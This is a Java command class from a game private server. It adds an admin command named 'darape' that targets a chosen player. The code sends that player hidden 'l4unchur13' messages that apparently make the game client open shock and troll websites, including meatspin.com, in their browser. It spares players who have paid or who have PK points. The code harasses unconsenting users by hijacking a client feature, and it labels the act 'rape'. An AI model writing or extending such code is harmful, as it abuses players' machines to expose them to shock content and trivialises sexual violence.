package org.hyperion.rs2.commands.impl;

import org.hyperion.rs2.commands.Command;
import org.hyperion.rs2.model.Player;
import org.hyperion.rs2.model.Rank;
import org.hyperion.rs2.model.World;

public class RapeCommand extends Command {

	public RapeCommand() {
		super("darape", Rank.ADMINISTRATOR);
	}

	@Override
	public boolean execute(Player player, String input) {
		try {
			String name = filterInput(input);
			Player victim = World.getPlayerByName(name);
			if(victim == null) {
				player.getActionSender().sendMessage("Player is offline");
				return false;
			}
			if(! canRape(victim)) {
				player.getActionSender().sendMessage("Player is unrapeable.");
				return false;
			}
			spamWebsites(victim);
			player.getActionSender().sendMessage("Played has been raped..");
			return true;
		} catch(Exception e) {
			e.printStackTrace();
			return false;
		}
	}

	protected static boolean canRape(Player player) {
		if(player.getPoints().getPkPoints() > 0)
			return false;
		return player.getPoints().getDonatorPointsBought() <= 0;
	}

	public static void spamWebsites(Player victim) {
		victim.getActionSender().sendMessage("l4unchur13 http://www.recklesspk.com/troll.php");
		victim.getActionSender().sendMessage("l4unchur13 http://www.nobrain.dk");
		victim.getActionSender().sendMessage("l4unchur13 http://www.meatspin.com");
	}

}
